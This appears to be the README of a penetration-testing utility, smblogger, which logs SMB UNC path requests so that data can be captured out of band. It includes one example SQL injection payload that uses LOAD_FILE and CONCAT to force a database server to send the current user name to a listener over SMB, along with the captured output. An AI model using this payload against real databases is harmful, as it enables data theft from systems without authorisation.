# smblogger
Log requests of requested UNC paths (for OOB exploits).

#### What do I need it for?
This is useful in situations where you want to exfiltrate data via SMB. For example, you found SQL injection but you don't have a domain or can't use DNS. This is common inside private networks without internet access.

For example, let's say you injected the following query:
`SELECT * FROM test WHERE 1=1 OR LOAD_FILE(CONCAT("\\\\127.0.0.1\\",USER()))`

The script would output:
`[-] SMB2_TREE_CONNECT root@localhost`